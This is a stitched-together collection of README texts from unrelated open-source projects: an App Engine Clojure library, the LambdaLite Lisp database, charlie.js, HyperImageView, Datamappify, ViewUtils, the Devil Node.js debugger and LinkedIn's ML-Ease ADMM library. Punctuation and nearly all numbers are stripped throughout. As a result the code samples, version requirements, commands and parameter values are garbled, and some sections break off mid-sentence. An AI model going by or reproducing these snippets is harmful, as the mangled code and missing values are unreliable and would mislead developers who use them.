method set to post  and enctype set to multipart and form data each uploaded file must have a name attribute  your application must provide an upload callback url app engine will make an http post request to that url once the file upload completes this callback s request will contain information about the uploaded files the callback should save this data in some way that makes sense for the application the callback implementation must end with an invocation of the callback complete function do not attempt to return a ring response map from an upload handler  a ring handler which serves up a blob must end with an invocation of the serve function do not attempt to return a ring response map from a blob serving handler nb in the repl environment and in devappserver sh  using the blobstore writes entities into the datastore blobinfo and blobuploadsession this does not happen in the production environment upload url success path initializes an upload session and returns its url success path is the url of the upload callback delete blob keys deletes the given blobs by their keys serve ring request map blob key modifies the given ring request map to serve up the given blob callback complete ring request map destination redirects the uploading http client to the given destination uploaded blobs ring request map returns a map of form upload name fields to blob keys this is confusing but a

app upload demo app handler note that the blobstore api primarily allows for browser driven file uploads appengine magic includes a hack which allows an application to upload a blob without a browser upload hack contents success path upload contents into the blobstore when the upload completes app engine will make a request to the success path url just like in a regular blobstore upload this callback should record the blob key of the uploaded data contents is either a single map or a vector of maps each with the following keys field the name of the imitation form field used as keys in the result of uploaded blobs filename bytes byte array of the uploaded data the appengine magic services mail namespace provides helper functions for sending and receiving mail in an app engine application to send an mail message construct it using make message and make attachment functions and send it using the send function to receive incoming mail first read and understand the relevant section in google s official need to modify your application s appengine web xml  and you should add a security constraint for and ah and mail and urls in your web xml in your application add a ring handler for post methods for urls which begin with and ah and mail make attachment filename bytes constructs an attachment object for a file with the given filename and consisting of the given bytes make message this function has many keyword parameters and constructs a message object the parameters are self explanatory from  to takes a string or a vector  subject  cc takes a string or a vector

on configuring queue xml  and on securing task urls in web xml in addition the section on scheduled is useful use the add function to add a new task to a queue and provide a callback url which

width height rotate degrees clockwise horizontal flip vertical flip app engine has an implementation of server push through its channel service appengine magic services channel using it requires a combination of client side javascript event callbacks and channel management on the conceptually the server maintains one or more channels associated with a client id this is a small number it is probably safest to assume only one channel per id the server opens a channel which generates a channel token this token must be passed to the connecting client the client then uses the token to receive messages from the server create channel client id creates a new channel and returns a token javascript code will use this token to connect to the server make message client id message string makes a message object destined for all channels associated with the given client id send message object sends the given message object send client id message string sends the given string to the given client parse presence ring request map returns a clientstatus record containing two fields status and id if the client just connected the status is connected otherwise disconnected nb the current version of the channel service does not help with channel bookkeeping it probably cleans up idle channels internally but does not inform the application of this the application is responsible for keeping track of active channels the client needs to load the javascript code at and ah and channel and jsapi once this library loads the client must initiate a request in which the server can return the channel id once this is done the rest of the client api looks like this javascript and and read this from a normal server response var channeltoken and and open a socket to the server var channel new goog appengine channel channeltoken var socket channel open and and implement these callbacks to take action when an event occurs socket onopen function evt var data evt data socket onmessage function evt var data evt data socket onerror function evt var data evt data socket onclose function evt var data evt data nb the development implementations of the channel service just poll

mappings for any necessary supporting urls google app engine maintains a whitelist of permitted classes in java s standard library other classes will cause your application to fail to deploy examples include threads and sockets if you use those in your application it will not work this means that you cannot use clojure s agents or futures in addition if one of your dependencies uses those your application will also not work for example clojure java io and its fore runner duck streams from clojure contrib  uses java net socket  a forbidden class whenever you add a new dependency no matter how innocuous you should make sure your app still works devappserver sh is a good place to start but you must also test in the main app engine the two do not always load classes the same many thanks

27461409, lambdalite  a functional relational database in about  lines of common lisp sql nosql orms key value stores there are a variety of approaches available for dealing with data lambdalite might be called functional and relational for lack of better terms the relational part is straightfoward data is organized into tables the functional part comes from a break with traditional sql style query languages lisp function closures are used to express queries over in memory in process lisp data people often ask why lisp it s hard to sum up all the benefits of lisp in a few words however what lambdalite does would be impossible in most languages lambdalite s where clauses are macros that seek out and prefixed keywords and replace them with row attribute references the resulting expression becomes a function closure that is compiled by most lisp implementations into native code is that cool or what consider the following sql query select from users where upper name bob a few problems are apparent the upper function is part of a separate language with its own syntax and semantics the whole query is represented as a string in our application language so it misses out on highlighting completion validation etc parameterization of bob into a variable lacks elegance in most sql client libraries under lambdalite we could instead write select users where equal string upcase and name bob why is this useful it s actual lisp syntax everything is a lisp function e g string upcase or macro bob can be parameterized natively by any lisp variable the where clause forms a compiled function closure with the full expressiveness of lisp notice that and name begins with a slash this is to distinguish it as a row attribute instead of an ordinary lisp keyword lambdalite is schemaless for flexibility rather than defining tables themselves you define attributes that can be used on any table using defattributes like so defmacro str member rest strings lambda x member x  strings test string defattributes and ticket id integerp and title lambda x  length x  and ticket type str member defect enhancement question and mocl version str member           n and a and target os str member ios android os x n and a and dev os str member mac os x linux  bit linux  bit n and a and description lambda x  length x  and created date and created by and modified date and user id and display name lambda x and x  length x  ppcre scan a za z  a za z  a za z  and x this will define getter functions that can be used like and ticket id row as well as validation functions like valid title p title require lambdalite use package lambdalite load db path and db and insert cars and car id  and make honda and color blue and car id  and make ford and color red  select cars where equal and color red and car id  and make ford and color red defmacro str member rest strings lambda x member x  strings test string defattributes and car id integerp and make stringp and color str member red green blue valid color p asdf nil dolist row select cars format t make a color a and make row and color row make honda color blue make ford color red mapcar and color select cars blue red insert cars and car id  and make toyota and color green and car id  and make audi and color red  sort select cars string key and make and car id  and make audi and color red and car id  and make ford and color red and car id  and make honda and color blue and car id  and make toyota and color green lambdalite provides the with tx macro to wrap transactions which are executed serially across threads for example the following code is safe under a multi threaded web server like hunchentoot create a new ticket with tx let user id logged in user id ticket id  and length select tickets unless user id error not logged in insert tickets list and ticket id ticket id and created by user id and ticket status open any data commands that are used outside of a with tx transaction will automatically be treated each individually as separate transactions do things that don t scale mdash paul graham lambdalite is completely unscalable mdash by design don t use it for heavy loads or large data sets even medium sized jobs are a stretch that s why lite is in the name lambdalite works under sbcl and probably other lisps
13042959, charlie js  a small framework for synchronizing video and css animations you can see a live demo here watch on a laptop and desktop and give it at least  seconds to really see how it works create your css animations with the naming convention  the animation properties should be defined with a class selector that matches the name of the corresponding keyframe animation name grow animation duration s animation timing function linear animation iteration count  animation direction normal animation fill mode forwards keyframes grow width px height px  width px height px notice the class name matches the animation name matches the keyframes add the charlie class data animations and data times  in your markup add a charlie class to any element that you will animate then add two data attributes data animations and data times data animations a comma separated list of the animation names that will run on this element the names should be the same as the class and keyframe combo in your stylesheet data times a comma separated list of times when the animations will run these times are synced with the video there must be one time for every animation times are in seconds with a resolution to a tenth of a second include the right javascript  within the demo directory of this project is a charlie js which contains charlie js plus all of its dependencies you can use this version if you want or you can include charlie js and it s dependencies individually you must include underscore js and the polyfills js file in this repository make the charlie setup video call  somewhere in your javascript get a reference to the video element you will sync with the animations then call charlie setup javascript charlie setup video include javascript callbacks with charlie addcallback  for fancier and more complicated use cases you will need more than just css animations there will be other state on your page you need to maintain so you can add javascript callbacks at arbitrary times javascript charlie addcallback function and and do stuff in here    charlie js does a pretty good job of maintaining animation state and keeping everything in sync as you jump around a video but this is not the case with your javascript callbacks as of now if you add a bunch of callbacks that affect the state of the page you will have to manually handle keeping the state in sync if a user starts jumping around in the video so you will need to add event listeners to the video by hand eventually charlie js might add some better mechanisms to help but you re on your own for now  there is a bug in chrome where the cssrules property on a stylesheet is null if you load the stylesheet using the file protocol so you ll have to serve up the demo you can t just open the file does not respond to framerate changes so if the video stutters or you want to slow down the rate of the video the animations will be out of sync
6145206, the android page curl is a d view which simulates a page curl effect without opengl only the android canvas has been used so that it can be used in any version of android the synchronizing e reader for android by now it just switches between  images but the idea is to render any view to animage and using two foregound and background images to create the effect in some thime the flipper will inherit from viewgroup instead if view so that content providers and adapters will be able to add views to it

18835804, hyperimageview  hyperimageview is an easy to use ios user interface control and an alternative for uiimageview where the developer wants to display images with high performance it converts an image into raw pixel data and saves it on the disk afterward whenever the image needs to be rendered hyperimageview reads the cached file from the disk and directly loads it into the video memory therefore hyperimageview can render images up to  times faster than uiimageview while uses  times less ram at the expense of a reasonable disk space also the rendering task takes place in a background thread and it never blocks user interaction even for very large images here i introduce this control  hyperimageview is thread safe which means it can render the image in a background thread hence it does not block ui interaction while uiimageview renders the image on the main thread so it blocks the user interaction while it s rendering and even gets worse if the image is a large one e g x  jpeg is the most popular format for saving images since it has high compression ratio thus developers choose it to get a smaller bundle size for their app suppose that we want to display a mb jpeg photo with uiimageview first it loads it into ram then decompresses it which is a heavy cpu bound process and stores the raw pixel bytes into ram then it copies the raw pixel bytes into video memory sometimes the live bytes of this process gets over mb because it applies various rgba format conversions on the raw pixel bytes so uiimageview poorly manages memory in comparison hyperimageview decompresses the photo once and saves the raw bytes on the disk therefore later displays of the photo using hyperimageview would be extremely fast since it read the bytes from disk and directly loads it into the video memory  suppose we want to develop an app to introduce elise restaurant we are interested to put an image slider there and display various photos of the elise restaurant and their foods so we will have e g  images that slide sequentially in  seconds intervals uiimageview will render the photos on each slide heavy cpu load huge ram usage and blocking the main thread high latency in displaying images if we use hyperimageview instead you cache images only once low ram usage and no main thread blocking super fast and light image display hyperimageview provides a huge performance improvement in displaying big enough images e g x and in cases that an image should be displayed multiple times in one run cycle of the app or constantly being displayed in the app in several runs the good example is elise restaurant intro app hyperimageview caches an image into a hyperimg file for a specific width and height you may resize the image with animation and you will be fine also note that sometimes resizing the hyperimageview control may cause regeneration of the hyperimg file for a new size just add hyperimageview h and libhyperimageview a files to your xcode project add to your target hyperimageview hyper hyperimageview alloc initwithframe cgrectmake     nsfilemanager defaultmanager createdirectoryatpath and documents and hyperimageviewcache and stringbyexpandingtildeinpath withintermediatedirectories no attributes nil error nil hyper sethyperimageviewdefaultdir and documents and hyperimageviewcache and stringbyexpandingtildeinpath hyper loadimagewithpath nsbundle mainbundle pathforresource  oftype jpg priority hyperimgcacheprioritydefault self view addsubview hyper important notes as said earlier hyperimageview caches the images on to the disk you have to be careful about your application bundle size to calculate the hyperimg file size height x width x  for non retina devices height x width x  for retina devices if you profile hyperimageview with insturments for memory allocations you will see that insruments shows some memory allocations for hyperimageview though hyperimageview never allocate memory it directly accesses video memory and copies the pixel data from hyperimg files there but instruments perceive it as memory allocation hyperimageview does not allocate any additional memory for rendering the image other than the uiview s itself hyperimageview does not use any private api calls hyperimageview is compatible with retina and non retina devices hyperimageview is compatible and tested with uiview block animations hyperimageview is tested with ios  please don t hesitate to mail me your feedbacks and suggestions or any bug report hamidreza  hyperimageview   lite version copyright c hamidreza vakilian all rights reserved license summary license does not expire can be distributed in  projects can be distributed and and or packaged as a code or binary product sublicensed non commercial use only cannot modify source code for any purpose cannot create derivative works attribution to software creator must be made as specified please include a link to hyperimageview com in your distributions

790660, datamappify is no longer being maintained it started off with a noble goal unfortunately due to it being on the critical path of our project we have decided not to continue developing it given the lack of development time from me  feel free to read the readme and browse the code i still believe in the solutions for this particular domain the typical rails and activerecord way of building applications is great for small to medium sized projects but when projects grow larger and more complex your models too become larger and more complex it is not uncommon to have god classes such as a user model datamappify tries to solve two common problems in web applications  the coupling between domain logic and data persistence  the coupling between forms and models there are three main design goals  to have a set of data providers to encapsulate the handling of how the data is persisted this is especially useful for dealing with external data sources such as a web service for example by calling userrepository save user  certain attributes of the user entity are now persisted on a remote web service better yet dirty tracking and lazy loading are supported out of the box datamappify consists of three components entity contains models behaviour think an activerecord model with the persistence specifics removed repository is responsible for data retrieval and persistence e g find  save and destroy  etc data as the name suggests holds your model data it contains orm objects e g activerecord models below is a high level and somewhat simplified overview of datamappify s architecture you may implement your own data provider and criteria lib and datamappify and data  but datamappify comes with build in support for the following orms activerecord ruby   and activemodel   and add this line to your application s gemfile gem datamappify below is an example of a user entity with inline comments on how some of the dsls work class user include datamappify entity attribute firstname string attribute lastname string attribute age integer attribute passport string attribute driverlicense string attribute healthcare string nested entity composition composing the entity with attributes and validations from other entities class job include datamappify entity attributes title string validates title presence true end class user  attributesfrom job end essentially equals class user  attributes title string validates title presence true end attributesfrom job optionally you may prefix the attributes so that class hobby include datamappify entity attributes name string validates name presence true end class user  attributesfrom hobby prefixwith hobby end becomes class user  attributes hobbyname string validates hobbyname presence true end attributesfrom hobby prefixwith hobby entity reference references is a convenient method for attribute accountid integer attraccessor account and it assigns accountid the correct value user account account user accountid account id references account validates firstname presence true length minimum  validates passport presence true length minimum  def fullname firstname lastname inheritance is supported for entities for example class adminuser user attribute level integer class guestuser user attribute expiry datetime datamappify supports attribute lazy loading via the lazy module class user include datamappify entity include datamappify lazy when an entity is lazy loaded only attributes from the primary source e g user entity s primary source would be activerecord user as specified in the corresponding repository will be loaded other attributes will only be loaded once they are called this is especially useful if some of your data sources are external web services repository maps entity attributes to db columns better yet you can even map attributes to different orms below is an example of a repository for the user entity you can have more than one repositories for the same entity class userrepository include datamappify repository specify the entity class forentity user specify the default data provider for unmapped attributes optionally you may use datamappify config to config this globally defaultprovider activerecord specify any attributes that need to be mapped for attributes mapped from a different source class a foreign key on the source class is required for example lastname is mapped to the user activerecord class and its surname attribute driverlicense is mapped to the userdriverlicense activerecord class and its number attribute passport is mapped to the userpassport sequel class and its number attribute attributes not specified here are mapped automatically to user with provider activerecord mapattribute lastname to user surname mapattribute driverlicense to userdriverlicense number mapattribute passport to userpassport number  provider sequel mapattribute healthcare to userhealthcare number  provider sequel alternatively you may group attribute mappings if they share certain options group provider sequel do mapattribute passport to userpassport number mapattribute healthcare to userhealthcare number attributes can also be reverse mapped by specifying the via option for example the below attribute will look for hobbyid on the user object and map hobbyname from the name attribute of activerecord hobby this is useful for mapping form fields similar to activerecord s nested attributes mapattribute hobbyname to hobby name  via hobbyid by default datamappify maps attributes using an inferred reference foreign key for example the first mapping below will look for the userid key in bio  the second mapping below will look for the personid key in bio instead mapattribute bio to bio body mapattribute bio to bio body  referencekey personid class adminuserrepository userrepository forentity adminuser class guestuserrepository userrepository forentity guestuser mapattribute expiry to user expirydate in the above example both repositories deal with the activerecord user data model datamappify repository by default creates the underlying data model classes for you for example mapattribute driverlicense to userdata driverlicense number in the above example a datamppify data record activerecord userdriverlicense activerecord model will be created if you would like to customise the data model class you may do so by creating one either under the default namespace or under the datamappify data record nameofdataprovider namespace module userdata class driverlicense activerecord base your customisation module datamappify data record activerecord userdata class driverlicense activerecord base your customisation more repository apis are being added below is a list of the currently implemented apis  accepts an id user userrepository find  accepts an entity userrepository exists user returns an array of entities users userrepository all returns an array of entities users userrepository where firstname fred  driverlicense aabbccdd users userrepository match firstname fre  driverlicense bbcc you may compose search criteria via the criteria method users userrepository criteria where firstname fred order lastname asc limit   currently implemented criteria options where hash match hash order hash limit array limit integer  offset integer note it does not currently support searching attributes from different data providers  accepts an entity there is also save that raises datamappify data entitynotsaved userrepository save user datamappify supports attribute dirty tracking only dirty attributes will be saved sometimes it s useful to manually mark the whole entity or some attributes in the entity to be dirty in this case you could userrepository states markasdirty user marks the whole entity as dirty userrepository states find user changed true userrepository states find user firstnamechanged true userrepository states find user lastnamechanged true userrepository states find user agechanged true userrepository states markasdirty user firstname lastname marks only firstname and lastname as dirty userrepository states find user changed true userrepository states find user firstnamechanged true userrepository states find user lastnamechanged true userrepository states find user agechanged false accepts an entity there is also destroy that raises datamappify data entitynotdestroyed note that due to the attributes mapping any data found in mapped records are not touched for example the corresponding activerecord user record will be destroyed but activerecord hobby that is associated will not userrepository destroy user accepts an entity class and returns a new entity this is useful for using beforeinit and afterinit callbacks to set up the entity userrepository init userclass user beforeinit beforeload beforefind beforecreate beforeupdate beforesave beforedestroy afterinit afterload afterfind aftercreate afterupdate aftersave afterdestroy callbacks are defined in repositories and they have access to the entity for example class userrepository include datamappify repository beforecreate makemeadmin beforecreate makemeawesome aftersave makemesmile private def makemeadmin entity  def makemeawesome entity  def makemesmile entity  note returning either nil or false from the callback will cancel all subsequent callbacks and the action itself if it s a before callback datamappify also supports entity association it is experimental and it currently supports the following association types belongsto partially implemented hasone

6165935,  viewutils is a collection of category methods that extend uiview with all the handy little properties and functionality that you always wished were built in to begin with viewutils covers nib loading makes it easy to load views from nibs without a uiviewcontroller layout set and get position and width and height properties individually searching retrieve subviews based on class tag or arbitrary predicates responder find the first responder within a given view supported os sdk versions  supported build target ios   and mac os   xcode   apple llvm compiler   earliest supported deployment target ios   and mac os   earliest compatible deployment target ios   and mac os   note supported means that the library has been tested with this version compatible means that the library should work on this ios version i e it doesn t rely on any unavailable sdk features but is no longer being tested for compatibility and may require tweaking or bug fixes to run correctly arc compatibility  viewutils works with both arc and non arc projects there is no need to exclude viewutils files from the arc validation process or to convert viewutils using the arc conversion tool thread safety  uiview is inherently single threaded so viewutils methods should only be used on the main thread installation  to use the viewutils categories in an app just drag the viewutils h and m files demo files and assets are not needed into your project and import the header file into any class where you wish to make use of the viewutils functionality or include it in your prefix pch file to make it available globally within your project extension methods  viewutils extends uiview with the following methods and id instancewithnibname nsstring nibnameornil bundle nsbundle bundleornil owner id owner this method loads a view from a nib file the view to be loaded must be the first object in the file this method is useful for loading views such as uitableviewcells or icarousel item views the nib file is cached so subequent loads will perform better void loadcontentswithnibname nsstring nibnameornil bundle nsbundle bundleornil this method is similar to instancewithnibname  but instead of returning the first view in the nib file this method loads that view and then adds it as a subview to the view on which the method is called resizing the loaded view to fit the bounds of the superview if neccesary this is especially useful if you want to create a complex view composed of reusable subviews each stored in their own nib file uiview viewmatchingpredicate nspredicate predicate returns either the view itself of the first subview that matches the specified predicate if no subview matches the method returns nil uiview viewwithtag nsinteger tag ofclass class viewclass returns either the view itself of the first subview that has the specified tag value and is of the specified class this is safer than the regular viewwithtag method uiview viewofclass class viewclass returns either the view itself of the first subview of the specified class nsarray viewsmatchingpredicate nspredicate predicate nsarray viewswithtag nsinteger tag nsarray viewswithtag nsinteger tag ofclass class viewclass nsarray viewsofclass class viewclass these methods work exactly like their single view equivalents but instead of returning the first view that matches they return all views that match the search is performed in a depth first fashion uiview firstsuperviewmatchingpredicate nspredicate predicate uiview firstsuperviewofclass class viewclass uiview firstsuperviewwithtag nsinteger tag uiview firstsuperviewwithtag nsinteger tag ofclass class viewclass these methods work like the viewmatching and of and width versions but work up the view hierarchy instead of down and will return the first parent view that matches the specified criteria bool vieworanysuperviewmatchespredicate nspredicate predicate bool vieworanysuperviewiskindofclass class viewclass this method returns yes if the view or any superview in in the chain matches the criteria this is useful for event handling for example if you d like to know if a given touch was either on or within a given control or control type e g so you can ignore gestures performed on specific views bool issuperviewofview uiview view bool issubviewofview uiview view these methods allow you to determine if a view is a child of another view these methods will search the entire superview chain not just a single level so if one view is the superview of the superview of the other one it will still return yes uiviewcontroller firstviewcontroller this method uses the responder chain to identify the first view controller in the controller chain that is responsible for the view so for example if this method is called on a button it will return the view controller that hosts the view that contains that button uiview firstresponder this method returns the first responder if it is a subview of the view on which the method is called or nil if not if you don t know which subview tree the first responder might be located in calling this method on the main window or the root view of the current frontmost view controller should return the desired result void setleft cgfloat left right cgfloat right void setwidth cgfloat width right cgfloat right void settop cgfloat top bottom cgfloat bottom void setheight cgfloat height bottom cgfloat bottom it s often fiddly to set both the left and right edges of a view or set the width without affecting the right hand edge because the properties are linked these setter methods make it a little easier to do this by allowing you to set both properties with a single method call void crossfadewithduration nstimeinterval duration void crossfadewithduration nstimeinterval duration completion void void completion these methods use core animation to perform a crossfade transition of the specified duration a crossfade is often useful if you want to animate the change of some view property that does not already support animation a typical example would be changing the text in a uilabel or the image in a uiimageview extension properties  viewutils extends uiview with the following properties for setting the frame position and dimensions property nonatomic assign cgpoint origin the position within the superview of the view origin the top left corner this is equivalent to view frame origin property nonatomic assign cgsize size the outer dimensions of the view this is equivalent to view frame size property nonatomic assign cgfloat top property nonatomic assign cgfloat left property nonatomic assign cgfloat bottom property nonatomic assign cgfloat right the positions of the four corners of the view within the superview these positions are all relative to the top left corner of the superview so for example the view bottom property is equivalent to view top and view height property nonatomic assign cgfloat width property nonatomic assign cgfloat height the outer dimensions of the view these are equivalent to view size width and view size height respectively property nonatomic assign cgfloat x property nonatomic assign cgfloat y the position of the anchor point for the view typically the center within the superview these are equivqlent to view center x and view center y respectively property nonatomic assign cgsize boundssize property nonatomic assign cgfloat boundswidth property nonatomic assign cgfloat boundsheight the dimensions of the view bounds the inner size the bounds size is useful when the view has been transformed and you can no longer rely on the frame size to get or set the content dimensions accurately property nonatomic readonly cgrect contentbounds quite often you wish to position a subview to exactly fill its superview but in order to do that you must contruct a cgrect with the width and height of the superview s bounds and an origin of  unfortunately there is no guarantee that the superview bounds will have an origin of  because in a uiwindow that has been rotated or a uiscrollview that has been scrolled or zoomed the bounds origin will have been changed in order to correctly align the contents within the view frame the contentbounds property returns a rect that matches the bounds size but always has an origin of  property nonatomic readonly cgpoint contentcenter quite often you wish to position a subview in the exact center of its superview but calculating the center of a view is a tedious piece of code to write the contentcenter property returns this position

4620665, a collection of thin facade apis wrapped around html javascript features the goal is to provide a simple layer of abstraction on top of the native apis to insulate you the developer and more importantly your production code from potential inconsistencies bugs and even specification changes this is not a html shim and v for semantic tags it is not a library or framework it is not a polyfill for older browsers it is not a replacement for modernizr though it will have basic feature tests for the apis it wraps some api sugar flavor will be included but do not expect for this library to be as sugary as something like jquery you can wrap other abstraction layers easily on top of hive it will be an important read mandated part of the culture of this project that all code which is submitted must have some reasonable tests first and foremost each module starts with an example usage of the api see contributions below  so the eventual submitted code for that module must at a minimum actually pass the test of being able to run the example api we agree on moreover contributors should make a good effort to provide one or more integration tests unit tests not necessarily required  which ideally will be automatable we have not yet as a project chosen a specific testing framework or approach so these statements are not mandating how the tests are written only that there must be a good faith effort to provide tests along with code a first priority will be to write tests for the code which is already in this repository contributions  contributions are obviously welcomed and encouraged but let s be a little bit intentional about how we want this to work here are some suggestions for how to be most friendly in terms of contributions  pick of one the native html apis that you have some familiarity with perhaps from this list history web workers web sockets geolocation file and filesystem web dbs blobbuilder blob urls formdata device apis server sent events appcache web intents registerprotocolhandler  this project will follow example driven development practices make an example wrappername js file that illustrates how you think the api facade will and should be used this doesn t have to show all possible variations and it s not a contract etched in stone but it should illustrate the major use case s  submit a pull request with only your example file and explain the api facade you are proposing we ll discuss it in that pull request  once we feel that the api facade is in good shape amend your pull request to include a sample implementation named wrappername hive js  and we ll take it from there note please also include one or more tests along with the module s implementation see testing above also please avoid these things  reformatting this project s code style we ll decide on a code style later leave spaces tabs and semi colons in existing files alone  rewrite this project in some other language including coffeescript this is a javascript project we write javascript here period  convince us that we shouldn t do this or that some project xyz is already doing it better etc we ll take any valid good faith suggestions from any open source project but the goals of this project are unique and will not be shoe horned into any other project s goals  worry too much about stuff like if this will be amd compliant or whatever we ll decide on all that stuff later there will be a build tool and it ll have options for you to pick which flavor you prefer this single file is what you will include in your html javascript projects it will eventually be customizable with a build tool which will let you pick which module format amd commonjs customized module etc you prefer and then include only which api modules you need the entire api will be under the h namespace for instance xhr will be exposed as h xhr the code and all the documentation are released under the mit license

26640587, for the great ideas for the timeline implementation npm install g devil on windows  you need to have visual studio  pro to compile all packages if you don t have this exact version of vs you can try the following npm install g devil windows on linux  not using nvm you have to use the sudo command sudo npm install g devil you can install the module as a local package but then you will have to access it from the local nodemodules directory with node rather than using the normal command you have to reinstall the program if you change the node js version because the plugins need recompilation if you get an error like and usr and lib and nodemodules and devil and nodemodules and nodewebkit and nodewebkit and nw error while loading shared libraries libudev so  cannot open shared object file no such file or directory ubuntu sudo apt get install libudev fedora sudo yum install libgudev sudo ln s and usr and lib and libudev so  and usr and lib and libudev so  simply use the command or in case you have a local install node and path and to and devil you don t have to start your application separately just start devil and run your script from it after devil starts you have to select a file from your computer or the server in case of remote debugging and hit the run button it will start a server and a client and you can start doing your job if you want more advanced usage try help for more info the port and host of the server are configurable you can also start the program as a server or client only if you want remote debugging we have added a test application just to try out devil after starting devil just enter and and testapp or and path and to and devil and testapp and run it it has some basic functionality for testing you can use devil to debug an application running remotely you have to install the module both on the server machine the computer that runs your node js app that you want to debug and the client usually your computer start the server with devil s h     this will start devil without the client listening on any ip then run the client from your computer with devil c h ip where ip is the server s ip unlike node inspector this app is gui based and it s used mostly with the gui you can start any script from the gui and restart is as many times as you want reloading all the code every time this makes it much easier to debug and develop at the same time you can have devil running all the time and just start your program from it when it s time to test it will show you all the output in the console and the standard output of the process too you can view all the application sources as long as it s running live editing is enabled and saving can be enabled using a button in the gui the debugger is fully functioning all the functionality here classes in our code the profiler works as well continuous heap profiling is still not implemented but you can take a snapshot and profile cpu for heap snapshots we use a module called heapdump and for cpu the v profiler cpu profiler works with both   x and   x but if you are using   x you will be able to see charts and additional stuff   x has less features consider running devil with   x if you want the full profiler functionality are initialized before the timeline started also has a few other small improvements like memory dumps and cpu usage the console is fully supported as long as we have tested all logging functions display the right output also you can use colors if your node js application uses colors as stdout we translate that colors to css codes in the devtools console you can see the result in the screenshots below there is full runtime support and access to the global object and require you can require any application module from the console and use it runtime all that is needed is the application to be running still of course the mit license mit copyright c  newton soft ltd dev newton codes permission is hereby granted free of charge to any person obtaining a copy of this software and associated documentation files the software  to deal in the software without restriction including without limitation the rights to use copy modify merge publish distribute sublicense and and or sell copies of the software and to permit persons to whom the software is furnished to do so subject to the following conditions the above copyright notice and this permission notice shall be included in all copies or substantial portions of the software the software is provided as is  without warranty of any kind express or implied including but not limited to the warranties of merchantability fitness for a particular purpose and noninfringement in no event shall the authors or copyright holders be liable for any claim damages or other liability whether in an action of contract tort or otherwise arising from out of or in connection with the software or the use or other dealings in the software

22262962, what is ml ease copyright open source software included in ml ease what is admm quick start code structure input data format output models detailed instructions supporting team ml ease is the open sourced large scale machine learning library from linkedin currently it has admm based large scale logistic regression copyright  linkedin corporation licensed under the apache license version   the license you may not use this file except in compliance with the license you may obtain a copy of the license at unless required by applicable law or agreed to in writing software distributed under the license is distributed on an as is basis without warranties or conditions of any kind either express or implied the license information on third party code is included in notice liblinear copyright c   the liblinear project license apache   see below admm stands for alternating direction method of multipliers boyd et al  the basic idea of admm is as follows admm considers the large scale logistic regression model fitting as a convex optimization problem with constraints the admm algorithm is guaranteed to converge while minimizing the user defined loss function it enforces an extra constraint that coefficients from all partitions have to equal to solve this optimization problem admm uses an iterative process for each iteration it partitions the big data into many small partitions and fit an independent logistic regression for each partition then it aggregates the coefficients collected from all partitions learns the consensus coefficients and sends it back to all partitions to retrain after   iterations it ends up with a converged solution that is theoretically close to what you would have obtained if you trained it on a single machine installation this uses maven to compile command mvn clean install run admm  copy the jar and target and ml ease   jar with dependencies jar to hadoop gateway and then set up a config file like and examples and sample config job  to run admm hadoop jar ml ease   jar with dependencies jar com linkedin ml ease regression jobs regression sample config job you can see under src and main and java there are two directories avro and bjson naturally avro dir has the code for data in avro format inside the avro directory you will see   java classes it might look a little overwhelming in the beginning but the most important two classes are  admmprepare java is the job you need to call before you run admm i e admmtrain java this job makes sanity checks of the input data format and assigns partition id to each sample  admmtrain java is the job you need to call for training logistic regression with l it allows you to specify multiple l penalty parameters i e lambda at one run and if you specify the test data it will grab the first m samples or the first partition in your test data path and outputs log likelihood for each iteration and each lambda value other useful hadoop jobs include  admmtest java is a job for testing the model trained by admmtrain java on test data  admmtestloglik java is a job for computing loglikelihood given the output from admmtest java  naivetrain java is a job for training independent logistic regressions per key this is very useful when you want to train say per item model on hadoop while data for each item is quite small a standard flow for training and test admm is admmprepare admmtrain admmtest admmtestloglik a sample job flow in src and main and batch and avro admmprepare avro admmtrain avro admmtest avro admm avro the data must have two fields  response int  features name string term string value float all the other fields are optional we define a feature string to be represented as name and term for example suppose you have a feature called age   i e age between  years old to  years old the feature can be represented by name age term  value   if you don t want to use two fields to represent one feature feel free to set term as empty string note that name should never be empty strings training and test data should have the same format if not it is probably fine as long as both have fields response and features intercept does not need to be put into the training data below is a sample of training and test data record  response  features name   term   value   name   term   value   name   term   value   name   term   value   weight   offset   foo whatever weight is an optional field that specifies the weight of the observation default is   if you feel some observation is stronger than the others feel free to use this field say making the weak ones   offset is an optional field default is   when it is non zero the model will learn coefficients beta by x beta and offset instead of x beta foo is an extra field to let you know that admm allows you to put extra fields in output directory structure  best model saves the best model based on the sample test data over all iterations for all lambdas use it wisely because it may not mean the real best model for example if your sample test data is too small the variance of the model performance will become high so that the best model doesn t mean anything in that case use models from final model instead  final model saves the models for each lambda after the last iteration this is always a safe choice and it is strongly recommended  sample test loglik saves the sample test loglikelihood over all iterations for all lambdas this is simply for you to study the convergence output model format a model output record has the following format key string model name string term string value float key column saves the lambda value model saves the model output for that lambda name and term again represents a feature string and value is the learned coefficient note that the first element of the model is always intercept  which means the intercept below is a sample of the learned model for lambda   and   record  key    model name intercept  term  value   name   term   value   name   term   value   name   term   value   name   term   value   record  key    model name intercept  term  value   name   term   value   name   term   value   name   term   value   name

memory doesn t blow up but note the smaller this value is the better convergence becomes binary feature are all the features in this data binary true and false map key the field name for partitioning the data this is only useful for training per item model using naivetrain java num click replicates this is a trick for sparse data sets where positives are rare we replicate the clicks into n copies and give each of them  and n weight this helps in terms of convergence but also makes the data larger but note it should be less than number of partitions example value  when num blocks  example value  when num blocks  it shares parameters with admmprepare job e g num blocks binary feature num click replicates please make sure they are the same as what are specified in admmprepare job input paths

loglik results this job is mainly for training per item model i e for each item such as campaignid creativeid train an independent regression model it can also be used for training one logistic regression model for a large scale data that s why it is called naive train it splits the data into partitions train independent regression models for each partition and then take average of the coefficients the job parameters are very similar to admmtrain java except compute model mean whether to compute the mean of the coefficients that are learned from each partition claim it to be true only if you are training one regression model for a large data using naive method true and false data size threshold for per item model whether to ignore the item if the data size of this item is smaller than the threshold this tool is developed by applied relevance science team at linkedin people who contributed to this tool include deepak agarwal bee chung chen bo long liang zhang

